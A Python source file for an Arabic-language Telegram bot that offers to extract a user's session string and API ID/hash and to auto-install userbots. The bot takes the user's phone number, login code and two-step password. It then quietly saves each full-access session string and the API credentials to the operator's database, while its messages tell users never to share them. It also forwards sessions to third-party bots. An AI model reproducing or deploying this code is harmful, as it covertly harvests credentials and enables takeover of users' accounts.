import os
import re
import asyncio
from datetime import datetime
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    FloodWaitError,
    PhoneNumberInvalidError,
    PasswordHashInvalidError,
    ApiIdInvalidError
)
from motor.motor_asyncio import AsyncIOMotorClient
import aiohttp
from bs4 import BeautifulSoup

API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
MONGODB_URI = os.getenv("MONGODB_URI", "")

CHANNEL_USERNAME = "Tepthon"
GROUP_USERNAME = "TepthonHelp"
DEVELOPER_LINK = "t.me/a_s_q"
DEVELOPER_NAME = "محمد"

FACTORIES = [
    {"name": "المصنع الاول", "username": "TepthonMakerBot"},
    {"name": "المصنع الثاني", "username": "TepthonUserBot"},
    {"name": "المصنع الثالث", "username": "Tepthon3Bot"},
    {"name": "المصنع الرابع", "username": "Tepthon4Bot"},
    {"name": "المصنع الخامس", "username": "Tepthon5Bot"},
]

mongo_client = AsyncIOMotorClient(
    MONGODB_URI,
    maxPoolSize=50,
    serverSelectionTimeoutMS=5000,
    connectTimeoutMS=5000
)
db = mongo_client.session_bot
users_collection = db.users
sessions_collection = db.sessions
installs_collection = db.installs
api_credentials_collection = db.api_credentials

user_states = {}

class TelegramAPIExtractor:
    def __init__(self):
        self.base_url = "https://my.telegram.org"
        self.headers = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://my.telegram.org",
            "Referer": "https://my.telegram.org/auth",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        }
        self.user_sessions = {}
    
    async def send_code(self, phone: str, user_id: int) -> dict:
        cookie_jar = aiohttp.CookieJar()
        session = aiohttp.ClientSession(cookie_jar=cookie_jar)
        
        try:
            async with session.post(
                f"{self.base_url}/auth/send_password",
                data={"phone": phone},
                headers=self.headers
            ) as resp:
                if resp.status == 200:
                    result = await resp.json()
                    if "random_hash" in result:
                        self.user_sessions[user_id] = {
                            "session": session,
                            "cookie_jar": cookie_jar,
                            "random_hash": result["random_hash"],
                            "phone": phone
                        }
                        return {"success": True, "random_hash": result["random_hash"]}
                    else:
                        await session.close()
                        return {"success": False, "error": "لم يتم إرسال الكود"}
                else:
                    await session.close()
                    return {"success": False, "error": f"خطأ في الاتصال: {resp.status}"}
        except Exception as e:
            await session.close()
            return {"success": False, "error": str(e)}
    
    async def get_api_credentials(self, user_id: int, code: str) -> dict:
        if user_id not in self.user_sessions:
            return {"success": False, "error": "انتهت الجلسة، جرب من الأول"}
        
        session_data = self.user_sessions[user_id]
        session = session_data["session"]
        phone = session_data["phone"]
        random_hash = session_data["random_hash"]
        
        try:
            async with session.post(
                f"{self.base_url}/auth/login",
                data={
                    "phone": phone,
                    "random_hash": random_hash,
                    "password": code
                },
                headers=self.headers
            ) as login_resp:
                if login_resp.status != 200:
                    await self._cleanup_session(user_id)
                    return {"success": False, "error": "فشل تسجيل الدخول"}
                
                login_text = await login_resp.text()
                if "true" not in login_text.lower():
                    await self._cleanup_session(user_id)
                    return {"success": False, "error": "الكود خاطئ أو منتهي الصلاحية"}
            
            async with session.get(
                f"{self.base_url}/apps",
                headers={**self.headers, "Referer": f"{self.base_url}/"}
            ) as apps_resp:
                if apps_resp.status != 200:
                    await self._cleanup_session(user_id)
                    return {"success": False, "error": "فشل الوصول لصفحة التطبيقات"}
                
                apps_html = await apps_resp.text()
            
            soup = BeautifulSoup(apps_html, 'html.parser')
            
            form_controls = soup.find_all('span', class_='form-control')
            if form_controls and len(form_controls) >= 2:
                api_id_text = form_controls[0].get_text(strip=True)
                api_hash_text = form_controls[1].get_text(strip=True)
                
                if api_id_text and api_hash_text and api_id_text.isdigit():
                    await self._cleanup_session(user_id)
                    return {
                        "success": True,
                        "api_id": api_id_text,
                        "api_hash": api_hash_text,
                        "exists": True
                    }
            
            hash_input = soup.find('input', attrs={'name': 'hash'})
            if hash_input:
                page_hash = hash_input.get('value', '')
                
                if page_hash:
                    import random as rand_module
                    import string
                    app_name = ''.join(rand_module.choices(string.ascii_lowercase, k=8))
                    
                    async with session.post(
                        f"{self.base_url}/apps/create",
                        data={
                            'hash': page_hash,
                            'app_title': f'MyApp_{app_name}',
                            'app_shortname': app_name,
                            'app_url': '',
                            'app_platform': 'desktop',
                            'app_desc': ''
                        },
                        headers={**self.headers, "Referer": f"{self.base_url}/apps"}
                    ) as create_resp:
                        if create_resp.status == 200:
                            async with session.get(
                                f"{self.base_url}/apps",
                                headers={**self.headers, "Referer": f"{self.base_url}/"}
                            ) as apps_resp2:
                                if apps_resp2.status == 200:
                                    apps_html2 = await apps_resp2.text()
                                    soup2 = BeautifulSoup(apps_html2, 'html.parser')
                                    
                                    form_controls2 = soup2.find_all('span', class_='form-control')
                                    if form_controls2 and len(form_controls2) >= 2:
                                        api_id = form_controls2[0].get_text(strip=True)
                                        api_hash = form_controls2[1].get_text(strip=True)
                                        
                                        if api_id and api_hash and api_id.isdigit():
                                            await self._cleanup_session(user_id)
                                            return {
                                                "success": True,
                                                "api_id": api_id,
                                                "api_hash": api_hash,
                                                "exists": False
                                            }
            
            await self._cleanup_session(user_id)
            return {"success": False, "error": "لم يتم العثور على البيانات أو إنشاءها"}
            
        except Exception as e:
            await self._cleanup_session(user_id)
            return {"success": False, "error": str(e)}
    
    async def _cleanup_session(self, user_id: int):
        if user_id in self.user_sessions:
            session_data = self.user_sessions.pop(user_id)
            try:
                await session_data["session"].close()
            except:
                pass

api_extractor = TelegramAPIExtractor()

bot = TelegramClient("bot", API_ID, API_HASH)
bot.flood_sleep_threshold = 60
bot.start(bot_token=BOT_TOKEN)


async def save_user(user_id, username, first_name):
    await users_collection.update_one(
        {"user_id": user_id},
        {
            "$set": {
                "username": username,
                "first_name": first_name,
                "last_active": datetime.utcnow()
            },
            "$setOnInsert": {"created_at": datetime.utcnow()}
        },
        upsert=True
    )


async def save_session(user_id, phone, session_string):
    result = await sessions_collection.insert_one({
        "user_id": user_id,
        "phone": phone,
        "session_string": session_string,
        "status": "active",
        "created_at": datetime.utcnow()
    })
    return result.inserted_id


async def get_user_sessions(user_id):
    cursor = sessions_collection.find({"user_id": user_id, "status": "active"})
    return await cursor.to_list(length=100)


async def is_bot_in_chat(chat_username):
    try:
        bot_me = await bot.get_me()
        perms = await bot.get_permissions(f"@{chat_username}", bot_me.id)
        return perms is not None
    except Exception:
        return False


async def check_subscription(user_id):
    bot_in_channel = await is_bot_in_chat(CHANNEL_USERNAME)
    if bot_in_channel:
        try:
            channel_member = await bot.get_permissions(f"@{CHANNEL_USERNAME}", user_id)
            if not channel_member:
                return False, "channel"
        except Exception:
            return False, "channel"
    
    bot_in_group = await is_bot_in_chat(GROUP_USERNAME)
    if bot_in_group:
        try:
            group_member = await bot.get_permissions(f"@{GROUP_USERNAME}", user_id)
            if not group_member:
                return False, "group"
        except Exception:
            return False, "group"
    
    return True, None


async def send_subscription_message(event, sub_type):
    if sub_type == "channel":
        text = (
            "- قم بالاشتـراك بقناه السورس لاستخدام البـوت ✅\n"
            f"‹ @{CHANNEL_USERNAME} ›"
        )
        buttons = [[Button.url("انضم الان .", f"https://t.me/{CHANNEL_USERNAME}")]]
    else:
        text = (
            "- قم بالاشتـراك بكروب الدعم لاستخدام البـوت 🖤\n"
            f"‹ @{GROUP_USERNAME} ›"
        )
        buttons = [[Button.url("انضم الان .", f"https://t.me/{GROUP_USERNAME}")]]
    
    await event.respond(text, buttons=buttons)


def get_welcome_message(first_name, bot_username):
    return (
        f"- مرحـبـًا عـزيـزي {first_name} 🙋\n"
        f"في : @{bot_username}\n"
        "- لبـدء استخـراج الجلسة اختـر بـدء استخـراج الجلسـة .\n"
        "- إذا كنـت تريـد أن يكون حسـابك في أمـان تام فاختر تيرمكس\n"
        "- ملاحظـة :\n"
        f"- احـذر مشاركـة الكود لأحـد لأنه يستطيـع اختراق حسـابك ⚠️\n"
        f"المطـور : [{DEVELOPER_NAME}]({DEVELOPER_LINK})"
    )


def get_main_buttons():
    return [
        [Button.inline("استخراج جلسة .", b"extract_session")],
        [
            Button.inline("استخراج الايبيهات .", b"extract_api"),
            Button.inline("تنصيب تلقائي", b"auto_install")
        ],
        [Button.inline("المطورين", b"developers")]
    ]


@bot.on(events.NewMessage(pattern="/start"))
async def start_handler(event):
    user = event.sender
    user_id = user.id
    username = user.username or ""
    first_name = user.first_name or "صديقي"
    
    await save_user(user_id, username, first_name)
    
    is_subscribed, sub_type = await check_subscription(user_id)
    if not is_subscribed:
        await send_subscription_message(event, sub_type)
        return
    
    bot_me = await bot.get_me()
    welcome_msg = get_welcome_message(first_name, bot_me.username)
    buttons = get_main_buttons()
    
    await event.respond(welcome_msg, buttons=buttons, link_preview=False)


@bot.on(events.CallbackQuery(data=b"extract_session"))
async def extract_session_handler(event):
    user_id = event.sender_id
    
    is_subscribed, sub_type = await check_subscription(user_id)
    if not is_subscribed:
        await send_subscription_message(event, sub_type)
        return
    
    user_states[user_id] = {"state": "awaiting_phone", "data": {}}
    
    await event.edit(
        "- يلا يا معلم ابعتلي رقم تليفونك بالكود الدولي\n"
        "- مثال: +201234567890\n"
        "- خد بالك متغلطش في الرقم 👀",
        buttons=[[Button.inline("رجوع 🔙", b"back_to_main")]]
    )


@bot.on(events.CallbackQuery(data=b"extract_api"))
async def extract_api_handler(event):
    user_id = event.sender_id
    
    is_subscribed, sub_type = await check_subscription(user_id)
    if not is_subscribed:
        await send_subscription_message(event, sub_type)
        return
    
    user_states[user_id] = {"state": "awaiting_api_phone", "data": {}}
    
    await event.edit(
        "- يلا يا معلم ابعتلي رقم تليفونك بالكود الدولي 📱\n"
        "- مثال: +201234567890\n"
        "- هبعتلك كود على تيليجرام من my.telegram.org\n"
        "- وبعدين هستخرجلك API ID و API Hash 🔑",
        buttons=[[Button.inline("رجوع 🔙", b"back_to_main")]]
    )


@bot.on(events.CallbackQuery(data=b"auto_install"))
async def auto_install_handler(event):
    user_id = event.sender_id
    
    is_subscribed, sub_type = await check_subscription(user_id)
    if not is_subscribed:
        await send_subscription_message(event, sub_type)
        return
    
    buttons = []
    for i, factory in enumerate(FACTORIES):
        buttons.append([Button.inline(f"{factory['name']} @{factory['username']}", f"factory_{i}".encode())])
    buttons.append([Button.inline("رجوع 🔙", b"back_to_main")])
    
    await event.edit(
        "- اختـار البـوت المنـاسب للتنصيـب 🏭",
        buttons=buttons
    )


@bot.on(events.CallbackQuery(data=b"developers"))
async def developers_handler(event):
    await event.edit(
        "**المطوريين**\n\n"
        "[HMD](https://t.me/a_s_q)\n"
        "[Ahmed](https://t.me/Dev_Mido)\n"
        "[Abu al-Baraa](https://t.me/t_l_I_I)",
        buttons=[[Button.inline("رجوع 🔙", b"back_to_main")]],
        link_preview=False
    )


@bot.on(events.CallbackQuery(pattern=b"factory_\\d+"))
async def factory_selection_handler(event):
    user_id = event.sender_id
    factory_index = int(event.data.decode().split("_")[1])
    
    user_states[user_id] = {
        "state": "confirm_install",
        "data": {"factory_index": factory_index}
    }
    
    factory = FACTORIES[factory_index]
    
    await event.edit(
        f"- اخترت {factory['name']} (@{factory['username']})\n"
        "- هل تريد التنصيب الان ✅ ؟",
        buttons=[
            [
                Button.inline("نعم ✅", b"confirm_yes"),
                Button.inline("لا ❌", b"confirm_no")
            ]
        ]
    )


@bot.on(events.CallbackQuery(data=b"confirm_yes"))
async def confirm_install_handler(event):
    user_id = event.sender_id
    
    sessions = await get_user_sessions(user_id)
    
    if not sessions:
        await event.edit(
            "- ما عندك جلسات محفوظة يا صاحبي 😕\n"
            "- روح استخرج جلسة الأول وبعدين تعال نصّب",
            buttons=[[Button.inline("رجوع 🔙", b"back_to_main")]]
        )
        return
    
    buttons = []
    for session in sessions:
        phone = session.get("phone", "رقم مجهول")
        session_id = str(session["_id"])
        buttons.append([
            Button.inline(f"{phone}", f"show_session_{session_id}".encode()),
            Button.inline("قم الان بالتنصيب ✅", f"install_{session_id}".encode())
        ])
    buttons.append([Button.inline("رجوع 🔙", b"back_to_main")])
    
    state_data = user_states.get(user_id, {}).get("data", {})
    user_states[user_id] = {
        "state": "select_session",
        "data": state_data
    }
    
    await event.edit(
        "- هذه الجلسات التي قمت باستخراجها سابقآ\n"
        "- اختار حساب للتنصيب 📱",
        buttons=buttons
    )


@bot.on(events.CallbackQuery(data=b"confirm_no"))
async def cancel_install_handler(event):
    await back_to_main(event)


@bot.on(events.CallbackQuery(pattern=b"install_.*"))
async def install_session_handler(event):
    user_id = event.sender_id
    session_id = event.data.decode().split("_")[1]
    
    state_data = user_states.get(user_id, {}).get("data", {})
    factory_index = state_data.get("factory_index", 0)
    factory = FACTORIES[factory_index]
    
    await event.edit(
        f"- جاري التنصيب على {factory['name']}...\n"
        "- استنى شوية يا معلم ⏳"
    )
    
    session_doc = await sessions_collection.find_one({"_id": __import__("bson").ObjectId(session_id)})
    
    if not session_doc:
        await event.edit(
            "- الجلسة مش موجودة أو انحذفت 😕",
            buttons=[[Button.inline("رجوع 🔙", b"back_to_main")]]
        )
        return
    
    session_string = session_doc["session_string"]
    
    try:
        user_client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await user_client.connect()
        
        if not await user_client.is_user_authorized():
            await event.edit(
                "- الجلسة منتهية أو مش شغالة 😕\n"
                "- جرب استخرج جلسة جديدة",
                buttons=[[Button.inline("رجوع 🔙", b"back_to_main")]]
            )
            await user_client.disconnect()
            return
        
        factory_bot = await user_client.get_entity(f"@{factory['username']}")
        
        await event.edit(
            f"- جاري التنصيب على {factory['name']}...\n"
            "- الخطوة 1: إرسال /start ⏳"
        )
        await user_client.send_message(factory_bot, "/start")
        await asyncio.sleep(3)
        
        await event.edit(
            f"- جاري التنصيب على {factory['name']}...\n"
            "- الخطوة 2: الضغط على Create a userbot ⏳"
        )
        messages = await user_client.get_messages(factory_bot, limit=1)
        clicked_first = False
        if messages and messages[0].buttons:
            msg = messages[0]
            if msg.buttons and len(msg.buttons) > 0 and len(msg.buttons[0]) > 0:
                first_btn = msg.buttons[0][0]
                await msg.click(data=first_btn.data)
                clicked_first = True
                await asyncio.sleep(3)
        
        if not clicked_first:
            await event.edit(
                "- المصنع مش رد بأزرار 😕\n"
                "- جرب مصنع آخر",
                buttons=[[Button.inline("رجوع 🔙", b"auto_install")]]
            )
            await user_client.disconnect()
            return
        
        await event.edit(
            f"- جاري التنصيب على {factory['name']}...\n"
            "- الخطوة 3: الضغط على تنصيب بالجلسة ⏳"
        )
        messages = await user_client.get_messages(factory_bot, limit=1)
        clicked_second = False
        if messages and messages[0].buttons:
            msg = messages[0]
            if msg.buttons and len(msg.buttons) > 0 and len(msg.buttons[0]) > 0:
                first_btn = msg.buttons[0][0]
                await msg.click(data=first_btn.data)
                clicked_second = True
                await asyncio.sleep(3)
        
        if not clicked_second:
            await event.edit(
                "- المصنع مش رد بأزرار 😕\n"
                "- جرب مصنع آخر",
                buttons=[[Button.inline("رجوع 🔙", b"auto_install")]]
            )
            await user_client.disconnect()
            return
        
        await event.edit(
            f"- جاري التنصيب على {factory['name']}...\n"
            "- الخطوة 4: إرسال الجلسة ⏳"
        )
        await user_client.send_message(factory_bot, session_string)
        await asyncio.sleep(4)
        
        messages = await user_client.get_messages(factory_bot, limit=1)
        response_text = messages[0].text if messages else ""
        
        if messages and messages[0].buttons:
            msg = messages[0]
            if msg.buttons and len(msg.buttons) > 0 and len(msg.buttons[0]) > 0:
                first_btn = msg.buttons[0][0]
                await msg.click(data=first_btn.data)
                await asyncio.sleep(3)
                messages = await user_client.get_messages(factory_bot, limit=1)
                response_text = messages[0].text if messages else response_text
        
        await user_client.disconnect()
        
        if "ايقاف" in response_text or "متوقف" in response_text or "تواصل" in response_text:
            await event.edit(
                f"- هذا المصنع متوقف حالياً 😕\n"
                "- جرب مصنع آخر يا صاحبي",
                buttons=[[Button.inline("رجوع 🔙", b"auto_install")]]
            )
        elif "بنجاح" in response_text or "نجاح" in response_text or "تم" in response_text or "شغال" in response_text:
            await installs_collection.insert_one({
                "user_id": user_id,
                "session_id": session_id,
                "factory": factory["username"],
                "status": "success",
                "created_at": datetime.utcnow()
            })
            await event.edit(
                "- تم التنصيب بنجاح ✅\n"
                f"- على المصنع: {factory['name']}",
                buttons=[[Button.inline("رجوع 🔙", b"back_to_main")]]
            )
        else:
            await installs_collection.insert_one({
                "user_id": user_id,
                "session_id": session_id,
                "factory": factory["username"],
                "status": "pending",
                "created_at": datetime.utcnow()
            })
            await event.edit(
                "- تم إرسال الجلسة والضغط على الأزرار ✅\n"
                f"- على المصنع: {factory['name']}\n"
                "- روح شوف المصنع وتأكد من التنصيب",
                buttons=[[Button.inline("رجوع 🔙", b"back_to_main")]]
            )
            
    except Exception as e:
        await event.edit(
            f"- حصل مشكلة أثناء التنصيب 😕\n"
            "- جرب تاني أو اختار مصنع آخر",
            buttons=[[Button.inline("رجوع 🔙", b"back_to_main")]]
        )


@bot.on(events.CallbackQuery(data=b"back_to_main"))
async def back_to_main(event):
    user_id = event.sender_id
    user_states.pop(user_id, None)
    
    await api_extractor._cleanup_session(user_id)
    
    user = await event.get_sender()
    first_name = user.first_name or "صديقي"
    bot_me = await bot.get_me()
    
    welcome_msg = get_welcome_message(first_name, bot_me.username)
    buttons = get_main_buttons()
    
    await event.edit(welcome_msg, buttons=buttons, link_preview=False)


@bot.on(events.NewMessage(func=lambda e: e.is_private and not e.text.startswith("/")))
async def message_handler(event):
    user_id = event.sender_id
    text = event.text.strip()
    
    if user_id not in user_states:
        return
    
    state = user_states[user_id]["state"]
    data = user_states[user_id]["data"]
    
    if state == "awaiting_phone":
        phone = text.replace(" ", "").replace("-", "")
        if not phone.startswith("+"):
            phone = "+" + phone
        
        if not re.match(r"^\+\d{10,15}$", phone):
            await event.respond(
                "- يا عم دا مش رقم صحيح 😅\n"
                "- ابعت الرقم بالكود الدولي زي كدا: +201234567890"
            )
            return
        
        data["phone"] = phone
        user_states[user_id]["state"] = "awaiting_code"
        
        try:
            temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
            await temp_client.connect()
            
            sent_code = await temp_client.send_code_request(phone)
            data["phone_code_hash"] = sent_code.phone_code_hash
            data["temp_session"] = temp_client.session.save()
            
            await temp_client.disconnect()
            
            await event.respond(
                "- تمام بعتلك كود على التيليجرام 📲\n"
                "- ابعتلي الكود هنا\n"
                "- بس خد بالك افصل بين الأرقام بمسافة أو شرطة عشان تيليجرام ميعملش مشاكل\n"
                "- مثال: 1 2 3 4 5",
                buttons=[[Button.inline("إلغاء ❌", b"back_to_main")]]
            )
        except PhoneNumberInvalidError:
            await event.respond(
                "- الرقم دا مش صح يا صاحبي 😕\n"
                "- تأكد من الرقم وابعته تاني"
            )
            user_states[user_id]["state"] = "awaiting_phone"
        except FloodWaitError as e:
            await event.respond(
                f"- يا عم تيليجرام عامل بلوك مؤقت ⏳\n"
                f"- استنى {e.seconds} ثانية وجرب تاني"
            )
            user_states.pop(user_id, None)
        except Exception as e:
            await event.respond(
                "- حصلت مشكلة يا معلم 😕\n"
                "- جرب تاني بعد شوية"
            )
            user_states.pop(user_id, None)
    
    elif state == "awaiting_code":
        code = text.replace(" ", "").replace("-", "")
        
        if not code.isdigit():
            await event.respond(
                "- دا مش كود صحيح يا صاحبي 😅\n"
                "- ابعت الأرقام بس"
            )
            return
        
        try:
            temp_client = TelegramClient(StringSession(data["temp_session"]), API_ID, API_HASH)
            await temp_client.connect()
            
            try:
                await temp_client.sign_in(
                    phone=data["phone"],
                    code=code,
                    phone_code_hash=data["phone_code_hash"]
                )
                
                session_string = temp_client.session.save()
                await save_session(user_id, data["phone"], session_string)
                
                await temp_client.disconnect()
                user_states.pop(user_id, None)
                
                await event.respond(
                    "- تمام يا معلم الجلسة جاهزة ✅\n"
                    "- خد الجلسة بتاعتك:\n\n"
                    f"`{session_string}`\n\n"
                    "- احفظها في مكان آمن ومتوريهاش لحد ⚠️",
                    buttons=[[Button.inline("رجوع للقائمة 🔙", b"back_to_main")]]
                )
                
            except SessionPasswordNeededError:
                user_states[user_id]["state"] = "awaiting_2fa"
                data["temp_session"] = temp_client.session.save()
                await temp_client.disconnect()
                
                await event.respond(
                    "- الحساب عليه تحقق بخطوتين 🔐\n"
                    "- ابعتلي كلمة السر",
                    buttons=[[Button.inline("إلغاء ❌", b"back_to_main")]]
                )
                
        except PhoneCodeInvalidError:
            await event.respond(
                "- الكود غلط يا صاحبي 😕\n"
                "- ابعت الكود الصح"
            )
        except PhoneCodeExpiredError:
            await event.respond(
                "- الكود انتهت صلاحيته ⏰\n"
                "- ابدأ من الأول وجرب تاني"
            )
            user_states.pop(user_id, None)
        except Exception as e:
            await event.respond(
                "- حصلت مشكلة يا معلم 😕\n"
                "- جرب تاني"
            )
    
    elif state == "awaiting_2fa":
        password = text
        
        try:
            temp_client = TelegramClient(StringSession(data["temp_session"]), API_ID, API_HASH)
            await temp_client.connect()
            
            await temp_client.sign_in(password=password)
            
            session_string = temp_client.session.save()
            await save_session(user_id, data["phone"], session_string)
            
            await temp_client.disconnect()
            user_states.pop(user_id, None)
            
            await event.respond(
                "- تمام يا معلم الجلسة جاهزة ✅\n"
                "- خد الجلسة بتاعتك:\n\n"
                f"`{session_string}`\n\n"
                "- احفظها في مكان آمن ومتوريهاش لحد ⚠️",
                buttons=[[Button.inline("رجوع للقائمة 🔙", b"back_to_main")]]
            )
            
        except PasswordHashInvalidError:
            await event.respond(
                "- كلمة السر غلط يا صاحبي 😕\n"
                "- ابعتها تاني صح"
            )
        except Exception as e:
            await event.respond(
                "- حصلت مشكلة يا معلم 😕\n"
                "- جرب تاني"
            )
    
    elif state == "awaiting_api_phone":
        phone = text.replace(" ", "").replace("-", "")
        if not phone.startswith("+"):
            phone = "+" + phone
        
        if not re.match(r"^\+\d{10,15}$", phone):
            await event.respond(
                "- يا عم دا مش رقم صحيح 😅\n"
                "- ابعت الرقم بالكود الدولي زي كدا: +201234567890"
            )
            return
        
        await event.respond("- جاري إرسال الكود لـ my.telegram.org... ⏳")
        
        result = await api_extractor.send_code(phone, user_id)
        
        if result["success"]:
            data["phone"] = phone
            user_states[user_id]["state"] = "awaiting_api_code"
            
            await event.respond(
                "- تمام بعتلك كود على تيليجرام من my.telegram.org 📲\n"
                "- الكود هيكون حروف وأرقام زي: `ZNVTrv3VvHw`\n"
                "- ابعتلي الكود بس (من غير أي كلام تاني)\n"
                "- مثال: ZNVTrv3VvHw",
                buttons=[[Button.inline("إلغاء ❌", b"back_to_main")]]
            )
        else:
            await event.respond(
                f"- حصلت مشكلة: {result['error']} 😕\n"
                "- جرب تاني بعد شوية",
                buttons=[[Button.inline("رجوع 🔙", b"back_to_main")]]
            )
            user_states.pop(user_id, None)
    
    elif state == "awaiting_api_code":
        code = text.strip()
        
        if len(code) < 5:
            await event.respond(
                "- الكود قصير جداً 😅\n"
                "- ابعت الكود الصحيح"
            )
            return
        
        await event.respond("- جاري استخراج API ID و API Hash... ⏳")
        
        phone = data.get("phone", "")
        
        result = await api_extractor.get_api_credentials(user_id, code)
        
        if result["success"]:
            api_id = result["api_id"]
            api_hash = result["api_hash"]
            was_existing = result.get("exists", False)
            
            await api_credentials_collection.insert_one({
                "user_id": user_id,
                "phone": phone,
                "api_id": api_id,
                "api_hash": api_hash,
                "created_at": datetime.utcnow()
            })
            
            status_msg = "موجود مسبقاً" if was_existing else "تم إنشاءه"
            
            await event.respond(
                f"- تمام يا معلم خلصنا ✅\n"
                f"- الحالة: {status_msg}\n\n"
                f"**API ID:**\n`{api_id}`\n\n"
                f"**API Hash:**\n`{api_hash}`\n\n"
                "- احفظهم في مكان آمن 🔐",
                buttons=[[Button.inline("رجوع للقائمة 🔙", b"back_to_main")]]
            )
        else:
            await event.respond(
                f"- حصلت مشكلة: {result['error']} 😕\n"
                "- جرب تاني أو تأكد من الكود",
                buttons=[[Button.inline("حاول مرة أخرى 🔄", b"extract_api"), Button.inline("رجوع 🔙", b"back_to_main")]]
            )
        
        user_states.pop(user_id, None)


print("- البوت شغال يا معلم ✅")
bot.run_until_disconnected()
